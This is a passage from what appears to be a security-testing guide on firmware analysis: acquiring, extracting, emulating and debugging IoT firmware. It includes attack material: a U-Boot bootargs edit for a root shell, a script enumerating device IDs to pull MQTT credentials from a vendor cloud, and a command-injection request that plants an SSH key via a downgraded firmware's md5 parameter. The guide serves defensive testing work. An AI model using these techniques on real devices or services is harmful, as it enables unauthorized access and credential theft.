  {{#endref}}\n\nFirmware is essential software that enables devices to operate correctly by managing and facilitating communication\
  \ between the hardware components and the software that users interact with. It's stored in permanent memory, ensuring the\
  \ device can access vital instructions from the moment it's powered on, leading to the operating system's launch. Examining\
  \ and potentially modifying firmware is a critical step in identifying security vulnerabilities.\n\n## **Gathering Information**\n\
  \n**Gathering information** is a critical initial step in understanding a device's makeup and the technologies it uses.\
  \ This process involves collecting data on:\n\n- The CPU architecture and operating system it runs\n- Bootloader specifics\n\
  - Hardware layout and datasheets\n- Codebase metrics and source locations\n- External libraries and license types\n- Update\
  \ histories and regulatory certifications\n- Architectural and flow diagrams\n- Security assessments and identified vulnerabilities\n\
  \nFor this purpose, **open-source intelligence (OSINT)** tools are invaluable, as is the analysis of any available open-source\
  \ software components through manual and automated review processes. Tools like [Coverity Scan](https://scan.coverity.com)\
  \ and [Semmle’s LGTM](https://lgtm.com/#explore) offer free static analysis that can be leveraged to find potential issues.\n\
  \n## **Acquiring the Firmware**\n\nObtaining firmware can be approached through various means, each with its own level of\
  \ complexity:\n\n- **Directly** from the source (developers, manufacturers)\n- **Building** it from provided instructions\n\
  - **Downloading** from official support sites\n- Utilizing **Google dork** queries for finding hosted firmware files\n-\
  \ Accessing **cloud storage** directly, with tools like [S3Scanner](https://github.com/sa7mon/S3Scanner)\n- Intercepting\
  \ **updates** via man-in-the-middle techniques\n- **Extracting** from the device through connections like **UART**, **JTAG**,\
  \ or **PICit**\n- **Sniffing** for update requests within device communication\n- Identifying and using **hardcoded update\
  \ endpoints**\n- **Dumping** from the bootloader or network\n- **Removing and reading** the storage chip, when all else\
  \ fails, using appropriate hardware tools\n\n### UART-only logs: force a root shell via U-Boot env in flash\n\nIf UART RX\
  \ is ignored (logs only), you can still force an init shell by **editing the U-Boot environment blob** offline:\n\n1. Dump\
  \ SPI flash with a SOIC-8 clip + programmer (3.3V):\n   ```bash\n   flashrom -p ch341a_spi -r flash.bin\n   ```\n2. Locate\
  \ the U-Boot env partition, edit `bootargs` to include `init=/bin/sh`, and **recompute the U-Boot env CRC32** for the blob.\n\
  3. Reflash only the env partition and reboot; a shell should appear on UART.\n\nThis is useful on embedded devices where\
  \ the bootloader shell is disabled but the env partition is writable via external flash access.\n\n## Analyzing the firmware\n\
  \nNow that you **have the firmware**, you need to extract information about it to know how to treat it. Different tools\
  \ you can use for that:\n\n```bash\nfile <bin>\nstrings -n8 <bin>\nstrings -tx <bin> #print offsets in hex\nhexdump -C -n\
  \ 512 <bin> > hexdump.out\nhexdump -C <bin> | head # might find signatures in header\nfdisk -lu <bin> #lists a drives partition\
  \ and filesystems if multiple\n```\n\nIf you don't find much with those tools check the **entropy** of the image with `binwalk\
  \ -E <bin>`, if low entropy, then it's not likely to be encrypted. If high entropy, Its likely encrypted (or compressed\
  \ in some way).\n\nMoreover, you can use these tools to extract **files embedded inside the firmware**:\n\n\n{{#ref}}\n\
  ../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md\n\
  {{#endref}}\n\nOr [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) to inspect the\
  \ file.\n\n### Getting the Filesystem\n\nWith the previous commented tools like `binwalk -ev <bin>` you should have been\
  \ able to **extract the filesystem**.\\\nBinwalk usually extracts it inside a **folder named as the filesystem type**, which\
  \ usually is one of the following: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.\n\n#### Manual Filesystem\
  \ Extraction\n\nSometimes, binwalk will **not have the magic byte of the filesystem in its signatures**. In these cases,\
  \ use binwalk to **find the offset of the filesystem and carve the compressed filesystem** from the binary and **manually\
  \ extract** the filesystem according to its type using the steps below.\n\n```\n$ binwalk DIR850L_REVB.bin\n\nDECIMAL HEXADECIMAL\
  \ DESCRIPTION\n----------------------------------------------------------------------------- ---\n\n0 0x0 DLOB firmware\
  \ header, boot partition: \"\"\"\"dev=/dev/mtdblock/1\"\"\"\"\n10380 0x288C LZMA compressed data, properties: 0x5D, dictionary\
  \ size: 8388608 bytes, uncompressed size: 5213748 bytes\n1704052 0x1A0074 PackImg section delimiter tag, little endian size:\
  \ 32256 bytes; big endian size: 8257536 bytes\n1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma,\
  \ size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41\n```\n\nRun the following **dd\
  \ command** carving the Squashfs filesystem.\n\n```\n$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs\n\n8257536+0\
  \ records in\n\n8257536+0 records out\n\n8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s\n```\n\nAlternatively,\
  \ the following command could also be run.\n\n`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`\n\n- For\
  \ squashfs (used in the example above)\n\n`$ unsquashfs dir.squashfs`\n\nFiles will be in \"`squashfs-root`\" directory\
  \ afterwards.\n\n- CPIO archive files\n\n`$ cpio -ivd --no-absolute-filenames -F <bin>`\n\n- For jffs2 filesystems\n\n`$\
  \ jefferson rootfsfile.jffs2`\n\n- For ubifs filesystems with NAND flash\n\n`$ ubireader_extract_images -u UBI -s <start_offset>\
  \ <bin>`\n\n`$ ubidump.py <bin>`\n\n## Analyzing Firmware\n\nOnce the firmware is obtained, it's essential to dissect it\
  \ for understanding its structure and potential vulnerabilities. This process involves utilizing various tools to analyze\
  \ and extract valuable data from the firmware image.\n\n### Initial Analysis Tools\n\nA set of commands is provided for\
  \ initial inspection of the binary file (referred to as `<bin>`). These commands help in identifying file types, extracting\
  \ strings, analyzing binary data, and understanding the partition and filesystem details:\n\n```bash\nfile <bin>\nstrings\
  \ -n8 <bin>\nstrings -tx <bin> #prints offsets in hexadecimal\nhexdump -C -n 512 <bin> > hexdump.out\nhexdump -C <bin> |\
  \ head #useful for finding signatures in the header\nfdisk -lu <bin> #lists partitions and filesystems, if there are multiple\n\
  ```\n\nTo assess the encryption status of the image, the **entropy** is checked with `binwalk -E <bin>`. Low entropy suggests\
  \ a lack of encryption, while high entropy indicates possible encryption or compression.\n\nFor extracting **embedded files**,\
  \ tools and resources like the **file-data-carving-recovery-tools** documentation and **binvis.io** for file inspection\
  \ are recommended.\n\n### Extracting the Filesystem\n\nUsing `binwalk -ev <bin>`, one can usually extract the filesystem,\
  \ often into a directory named after the filesystem type (e.g., squashfs, ubifs). However, when **binwalk** fails to recognize\
  \ the filesystem type due to missing magic bytes, manual extraction is necessary. This involves using `binwalk` to locate\
  \ the filesystem's offset, followed by the `dd` command to carve out the filesystem:\n\n```bash\n$ binwalk DIR850L_REVB.bin\n\
  \n$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs\n```\n\nAfterwards, depending on the filesystem type (e.g.,\
  \ squashfs, cpio, jffs2, ubifs), different commands are used to manually extract the contents.\n\n### Filesystem Analysis\n\
  \nWith the filesystem extracted, the search for security flaws begins. Attention is paid to insecure network daemons, hardcoded\
  \ credentials, API endpoints, update server functionalities, uncompiled code, startup scripts, and compiled binaries for\
  \ offline analysis.\n\n**Key locations** and **items** to inspect include:\n\n- **etc/shadow** and **etc/passwd** for user\
  \ credentials\n- SSL certificates and keys in **etc/ssl**\n- Configuration and script files for potential vulnerabilities\n\
  - Embedded binaries for further analysis\n- Common IoT device web servers and binaries\n\nSeveral tools assist in uncovering\
  \ sensitive information and vulnerabilities within the filesystem:\n\n- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng)\
  \ and [**Firmwalker**](https://github.com/craigz28/firmwalker) for sensitive information search\n- [**The Firmware Analysis\
  \ and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) for comprehensive firmware analysis\n- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer),\
  \ [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go),\
  \ and [**EMBA**](https://github.com/e-m-b-a/emba) for static and dynamic analysis\n\n### Security Checks on Compiled Binaries\n\
  \nBoth source code and compiled binaries found in the filesystem must be scrutinized for vulnerabilities. Tools like **checksec.sh**\
  \ for Unix binaries and **PESecurity** for Windows binaries help identify unprotected binaries that could be exploited.\n\
  \n## Harvesting cloud config and MQTT credentials via derived URL tokens\n\nMany IoT hubs fetch their per-device configuration\
  \ from a cloud endpoint that looks like:\n\n- `https://<api-host>/pf/<deviceId>/<token>`\n\nDuring firmware analysis you\
  \ may find that `<token>` is derived locally from the device ID using a hardcoded secret, for example:\n\n- token = MD5(\
  \ deviceId || STATIC_KEY ) and represented as uppercase hex\n\nThis design enables anyone who learns a deviceId and the\
  \ STATIC_KEY to reconstruct the URL and pull cloud config, often revealing plaintext MQTT credentials and topic prefixes.\n\
  \nPractical workflow:\n\n1) Extract deviceId from UART boot logs\n\n- Connect a 3.3V UART adapter (TX/RX/GND) and capture\
  \ logs:\n\n```bash\npicocom -b 115200 /dev/ttyUSB0\n```\n\n- Look for lines printing the cloud config URL pattern and broker\
  \ address, for example:\n\n```\nOnline Config URL https://api.vendor.tld/pf/<deviceId>/<token>\nMQTT: mqtt://mq-gw.vendor.tld:8001\n\
  ```\n\n2) Recover STATIC_KEY and token algorithm from firmware\n\n- Load binaries into Ghidra/radare2 and search for the\
  \ config path (\"/pf/\") or MD5 usage.\n- Confirm the algorithm (e.g., MD5(deviceId||STATIC_KEY)).\n- Derive the token in\
  \ Bash and uppercase the digest:\n\n```bash\nDEVICE_ID=\"d88b00112233\"\nSTATIC_KEY=\"cf50deadbeefcafebabe\"\nprintf \"\
  %s\" \"${DEVICE_ID}${STATIC_KEY}\" | md5sum | awk '{print toupper($1)}'\n```\n\n3) Harvest cloud config and MQTT credentials\n\
  \n- Compose the URL and pull JSON with curl; parse with jq to extract secrets:\n\n```bash\nAPI_HOST=\"https://api.vendor.tld\"\
  \nTOKEN=$(printf \"%s\" \"${DEVICE_ID}${STATIC_KEY}\" | md5sum | awk '{print toupper($1)}')\ncurl -sS \"$API_HOST/pf/${DEVICE_ID}/${TOKEN}\"\
  \ | jq .\n# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)\n```\n\n4) Abuse plaintext\
  \ MQTT and weak topic ACLs (if present)\n\n- Use recovered credentials to subscribe to maintenance topics and look for sensitive\
  \ events:\n\n```bash\nmosquitto_sub -h <broker> -p <port> -V mqttv311 \\\n  -i <client_id> -u <username> -P <password> \\\
  \n  -t \"<topic_prefix>/<deviceId>/admin\" -v\n```\n\n5) Enumerate predictable device IDs (at scale, with authorization)\n\
  \n- Many ecosystems embed vendor OUI/product/type bytes followed by a sequential suffix.\n- You can iterate candidate IDs,\
  \ derive tokens and fetch configs programmatically:\n\n```bash\nAPI_HOST=\"https://api.vendor.tld\"; STATIC_KEY=\"cf50deadbeef\"\
  ; PREFIX=\"d88b1603\" # OUI+type\nfor SUF in $(seq -w 000000 0000FF); do\n  DEVICE_ID=\"${PREFIX}${SUF}\"\n  TOKEN=$(printf\
  \ \"%s\" \"${DEVICE_ID}${STATIC_KEY}\" | md5sum | awk '{print toupper($1)}')\n  curl -fsS \"$API_HOST/pf/${DEVICE_ID}/${TOKEN}\"\
  \ | jq -r '.mqtt.username,.mqtt.password' | sed \"/null/d\" && echo \"$DEVICE_ID\"\ndone\n```\n\nNotes\n- Always obtain\
  \ explicit authorization before attempting mass enumeration.\n- Prefer emulation or static analysis to recover secrets without\
  \ modifying target hardware when possible.\n\n\nThe process of emulating firmware enables **dynamic analysis** either of\
  \ a device's operation or an individual program. This approach can encounter challenges with hardware or architecture dependencies,\
  \ but transferring the root filesystem or specific binaries to a device with matching architecture and endianness, such\
  \ as a Raspberry Pi, or to a pre-built virtual machine, can facilitate further testing.\n\n### Emulating Individual Binaries\n\
  \nFor examining single programs, identifying the program's endianness and CPU architecture is crucial.\n\n#### Example with\
  \ MIPS Architecture\n\nTo emulate a MIPS architecture binary, one can use the command:\n\n```bash\nfile ./squashfs-root/bin/busybox\n\
  ```\n\nAnd to install the necessary emulation tools:\n\n```bash\nsudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm\
  \ qemu-system-mips qemu-system-x86 qemu-utils\n```\n\nFor MIPS (big-endian), `qemu-mips` is used, and for little-endian\
  \ binaries, `qemu-mipsel` would be the choice.\n\n#### ARM Architecture Emulation\n\nFor ARM binaries, the process is similar,\
  \ with the `qemu-arm` emulator being utilized for emulation.\n\n### Full System Emulation\n\nTools like [Firmadyne](https://github.com/firmadyne/firmadyne),\
  \ [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), and others, facilitate full firmware\
  \ emulation, automating the process and aiding in dynamic analysis.\n\n## Dynamic Analysis in Practice\n\nAt this stage,\
  \ either a real or emulated device environment is used for analysis. It's essential to maintain shell access to the OS and\
  \ filesystem. Emulation may not perfectly mimic hardware interactions, necessitating occasional emulation restarts. Analysis\
  \ should revisit the filesystem, exploit exposed webpages and network services, and explore bootloader vulnerabilities.\
  \ Firmware integrity tests are critical to identify potential backdoor vulnerabilities.\n\n## Runtime Analysis Techniques\n\
  \nRuntime analysis involves interacting with a process or binary in its operating environment, using tools like gdb-multiarch,\
  \ Frida, and Ghidra for setting breakpoints and identifying vulnerabilities through fuzzing and other techniques.\n\nFor\
  \ embedded targets without a full debugger, **copy a statically-linked `gdbserver`** to the device and attach remotely:\n\
  \n```bash\n# On device\ngdbserver :1234 /usr/bin/targetd\n```\n\n```bash\n# On host\ngdb-multiarch /path/to/targetd\ntarget\
  \ remote <device-ip>:1234\n```\n\n## Binary Exploitation and Proof-of-Concept\n\nDeveloping a PoC for identified vulnerabilities\
  \ requires a deep understanding of the target architecture and programming in lower-level languages. Binary runtime protections\
  \ in embedded systems are rare, but when present, techniques like Return Oriented Programming (ROP) may be necessary.\n\n\
  ### uClibc fastbin exploitation notes (embedded Linux)\n\n- **Fastbins + consolidation:** uClibc uses fastbins similar to\
  \ glibc. A later large allocation can trigger `__malloc_consolidate()`, so any fake chunk must survive checks (sane size,\
  \ `fd = 0`, and surrounding chunks seen as \"in use\").\n- **Non-PIE binaries under ASLR:** if ASLR is enabled but the main\
  \ binary is **non-PIE**, in-binary `.data/.bss` addresses are stable. You can target a region that already resembles a valid\
  \ heap chunk header to land a fastbin allocation on a **function pointer table**.\n- **Parser-stopping NUL:** when JSON\
  \ is parsed, a `\\x00` in the payload can stop parsing while keeping trailing attacker-controlled bytes for a stack pivot/ROP\
  \ chain.\n- **Shellcode via `/proc/self/mem`:** a ROP chain that calls `open(\"/proc/self/mem\")`, `lseek()`, and `write()`\
  \ can plant executable shellcode in a known mapping and jump to it.\n\n## Prepared Operating Systems for Firmware Analysis\n\
  \nOperating systems like [AttifyOS](https://github.com/adi0x90/attifyos) and [EmbedOS](https://github.com/scriptingxss/EmbedOS)\
  \ provide pre-configured environments for firmware security testing, equipped with necessary tools.\n\n## Prepared OSs to\
  \ analyze Firmware\n\n- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS is a distro intended to help you perform\
  \ security assessment and penetration testing of Internet of Things (IoT) devices. It saves you a lot of time by providing\
  \ a pre-configured environment with all the necessary tools loaded.\n- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS):\
  \ Embedded security testing operating system based on Ubuntu 18.04 preloaded with firmware security testing tools.\n\n##\
  \ Firmware Downgrade Attacks & Insecure Update Mechanisms\n\nEven when a vendor implements cryptographic signature checks\
  \ for firmware images, **version rollback (downgrade) protection is frequently omitted**. When the boot- or recovery-loader\
  \ only verifies the signature with an embedded public key but does not compare the *version* (or a monotonic counter) of\
  \ the image being flashed, an attacker can legitimately install an **older, vulnerable firmware that still bears a valid\
  \ signature** and thus re-introduce patched vulnerabilities.\n\nTypical attack workflow:\n\n1. **Obtain an older signed\
  \ image**\n   * Grab it from the vendor’s public download portal, CDN or support site.\n   * Extract it from companion mobile/desktop\
  \ applications (e.g. inside an Android APK under `assets/firmware/`).\n   * Retrieve it from third-party repositories such\
  \ as VirusTotal, Internet archives, forums, etc.\n2. **Upload or serve the image to the device** via any exposed update\
  \ channel:\n   * Web UI, mobile-app API, USB, TFTP, MQTT, etc.\n   * Many consumer IoT devices expose *unauthenticated*\
  \ HTTP(S) endpoints that accept Base64-encoded firmware blobs, decode them server-side and trigger recovery/upgrade.\n3.\
  \ After the downgrade, exploit a vulnerability that was patched in the newer release (for example a command-injection filter\
  \ that was added later).\n4. Optionally flash the latest image back or disable updates to avoid detection once persistence\
  \ is gained.\n\n### Example: Command Injection After Downgrade\n\n```http\nPOST /check_image_and_trigger_recovery?md5=1;\
  \ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1\nHost: 192.168.0.1\nContent-Type:\
  \ application/octet-stream\nContent-Length: 0\n```\n\nIn the vulnerable (downgraded) firmware, the `md5` parameter is concatenated\
  \ directly into a shell command without sanitisation, allowing injection of arbitrary commands (here – enabling SSH key-based\
  \ root access). Later firmware versions introduced a basic character filter, but the absence of downgrade protection renders\
  \ the fix moot.\n\n### Extracting Firmware From Mobile Apps\n\nMany vendors bundle full firmware images inside their companion\
  \ mobile applications so that the app can update the device over Bluetooth/Wi-Fi. These packages are commonly stored unencrypted\
  \ in the APK/APEX under paths like `assets/fw/` or `res/raw/`. Tools such as `apktool`, `ghidra`, or even plain `unzip`\
  \ allow you to pull signed images without touching the physical hardware.\n\n```\n$ apktool d vendor-app.apk -o vendor-app\n\
  $ ls vendor-app/assets/firmware\nfirmware_v1.3.11.490_signed.bin\n```\n\n### Checklist for Assessing Update Logic\n\n* Is\
  \ the transport/authentication of the *update endpoint* adequately protected (TLS + authentication)?\n* Does the device\
  \ compare **version numbers** or a **monotonic anti-rollback counter** before flashing?\n* Is the image verified inside\
  \ a secure boot chain (e.g. signatures checked by ROM code)?\n* Does userland code perform additional sanity checks (e.g.\
  \ allowed partition map, model number)?\n* Are *partial* or *backup* update flows re-using the same validation logic?\n\n\
  > \U0001F4A1  If any of the above are missing, the platform is probably vulnerable to rollback attacks.\n\n## Vulnerable\
